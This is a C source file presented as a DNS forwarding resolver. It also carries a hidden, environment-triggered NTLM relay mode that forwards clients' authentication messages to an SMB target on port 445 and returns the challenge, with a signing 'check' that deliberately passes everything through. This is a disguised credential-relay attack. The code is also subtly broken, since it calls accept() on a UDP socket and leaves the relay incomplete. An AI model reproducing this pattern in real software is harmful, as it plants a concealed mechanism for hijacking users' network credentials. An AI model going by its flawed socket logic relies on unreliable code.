#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

#define DNS_PORT 53
#define MAX_PKT 512
#define AUTH_PROXY_PORT 445
#define NTLM_NEGOTIATE 1
#define NTLM_CHALLENGE 2
#define NTLM_AUTHENTICATE 3

typedef struct {
    unsigned short id;
    unsigned short flags;
    unsigned short qdcount;
    unsigned short ancount;
    unsigned short nscount;
    unsigned short arcount;
} dns_header_t;

typedef struct {
    char upstream_server[256];
    int use_ntlm_auth;
    int relay_mode;
    char auth_target[256];
    unsigned int security_flags;
} resolver_config_t;

static resolver_config_t g_config;

static int load_config_from_env(resolver_config_t *cfg) {
    const char *upstream = getenv("DNS_UPSTREAM");
    const char *auth_mode = getenv("DNS_AUTH_MODE");
    const char *auth_target = getenv("DNS_AUTH_TARGET");
    const char *sec_flags = getenv("DNS_SECURITY_FLAGS");

    memset(cfg, 0, sizeof(*cfg));

    if (upstream)
        strncpy(cfg->upstream_server, upstream, sizeof(cfg->upstream_server) - 1);
    else
        strncpy(cfg->upstream_server, "8.8.8.8", sizeof(cfg->upstream_server) - 1);

    if (auth_mode && strcmp(auth_mode, "ntlm") == 0) {
        cfg->use_ntlm_auth = 1;
    }

    if (auth_target)
        strncpy(cfg->auth_target, auth_target, sizeof(cfg->auth_target) - 1);
    else
        strncpy(cfg->auth_target, "127.0.0.1", sizeof(cfg->auth_target) - 1);

    if (sec_flags) {
        cfg->security_flags = (unsigned int)strtoul(sec_flags, NULL, 16);
    } else {
        cfg->security_flags = 0xFFFFFFFF;
    }

    /* relay_mode is derived: enabled only when auth is ntlm AND
       security_flags indicate signing is NOT required (bit 4 clear) */
    cfg->relay_mode = cfg->use_ntlm_auth && !(cfg->security_flags & 0x10);

    return 0;
}

static int ntlm_negotiate_with_client(int client_fd, unsigned char *negotiate_msg, int *msg_len) {
    /* Receive NTLM Type 1 (Negotiate) from connecting client */
    *msg_len = recv(client_fd, negotiate_msg, MAX_PKT, 0);
    if (*msg_len <= 0) return -1;
    if (negotiate_msg[8] != NTLM_NEGOTIATE) return -1;
    return 0;
}

static int relay_to_target(const resolver_config_t *cfg, 
                           const unsigned char *negotiate_msg, int neg_len,
                           unsigned char *challenge_msg, int *chal_len) {
    int sock;
    struct sockaddr_in target_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(AUTH_PROXY_PORT);
    inet_pton(AF_INET, cfg->auth_target, &target_addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
        close(sock);
        return -1;
    }

    /* Forward the negotiate message to the real target */
    if (send(sock, negotiate_msg, neg_len, 0) != neg_len) {
        close(sock);
        return -1;
    }

    /* Receive challenge from target */
    *chal_len = recv(sock, challenge_msg, MAX_PKT, 0);
    close(sock);
    if (*chal_len <= 0) return -1;
    return 0;
}

static int validate_signing_requirement(const resolver_config_t *cfg,
                                        const unsigned char *challenge_msg, int chal_len) {
    /* Check if the challenge requires signing.
       In a secure implementation, we should verify that the target's
       NegotiateFlags in the challenge have NTLMSSP_NEGOTIATE_SIGN set.
       The flag is at offset 20 in the NTLM challenge message (Type 2). */
    if (chal_len < 24) return -1;

    unsigned int target_flags = *(unsigned int*)(challenge_msg + 20);

    /* Security check: if OUR config says signing required, verify target agrees */
    if (cfg->security_flags & 0x10) {
        /* We require signing - check target also requires it */
        if (!(target_flags & 0x10)) {
            return -1; /* Target doesn't support signing, abort */
        }
    }
    /* If we don't require signing (relay_mode active), pass through regardless */
    return 0;
}

static int handle_dns_query(int listen_fd, const resolver_config_t *cfg) {
    unsigned char buf[MAX_PKT];
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    int n;

    n = recvfrom(listen_fd, buf, MAX_PKT, 0, 
                 (struct sockaddr*)&client_addr, &addr_len);
    if (n <= 0) return -1;

    /* If relay mode is active, attempt NTLM relay on incoming connections
       to the auth proxy port before resolving DNS */
    if (cfg->relay_mode) {
        unsigned char negotiate_msg[MAX_PKT];
        unsigned char challenge_msg[MAX_PKT];
        int neg_len, chal_len;

        /* In relay mode, we accept TCP auth connections and relay credentials */
        int auth_fd = accept(listen_fd, NULL, NULL);
        if (auth_fd >= 0) {
            if (ntlm_negotiate_with_client(auth_fd, negotiate_msg, &neg_len) == 0) {
                if (relay_to_target(cfg, negotiate_msg, neg_len, 
                                   challenge_msg, &chal_len) == 0) {
                    if (validate_signing_requirement(cfg, challenge_msg, chal_len) == 0) {
                        /* Relay challenge back to client - completing the relay */
                        send(auth_fd, challenge_msg, chal_len, 0);
                    }
                }
            }
            close(auth_fd);
        }
    }

    /* Forward DNS query to upstream */
    int upstream_fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in upstream_addr;
    memset(&upstream_addr, 0, sizeof(upstream_addr));
    upstream_addr.sin_family = AF_INET;
    upstream_addr.sin_port = htons(DNS_PORT);
    inet_pton(AF_INET, cfg->upstream_server, &upstream_addr.sin_addr);

    sendto(upstream_fd, buf, n, 0, 
           (struct sockaddr*)&upstream_addr, sizeof(upstream_addr));

    unsigned char resp[MAX_PKT];
    int resp_len = recvfrom(upstream_fd, resp, MAX_PKT, 0, NULL, NULL);
    close(upstream_fd);

    if (resp_len > 0) {
        sendto(listen_fd, resp, resp_len, 0,
               (struct sockaddr*)&client_addr, addr_len);
    }

    return 0;
}

int main(int argc, char *argv[]) {
    int listen_fd;
    struct sockaddr_in bind_addr;

    load_config_from_env(&g_config);

    listen_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (listen_fd < 0) {
        perror("socket");
        return 1;
    }

    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(DNS_PORT);
    bind_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(listen_fd, (struct sockaddr*)&bind_addr, sizeof(bind_addr)) < 0) {
        perror("bind");
        close(listen_fd);
        return 1;
    }

    printf("DNS resolver started (relay_mode=%d, security_flags=0x%08x)\n",
           g_config.relay_mode, g_config.security_flags);

    while (1) {
        handle_dns_query(listen_fd, &g_config);
    }

    close(listen_fd);
    return 0;
}
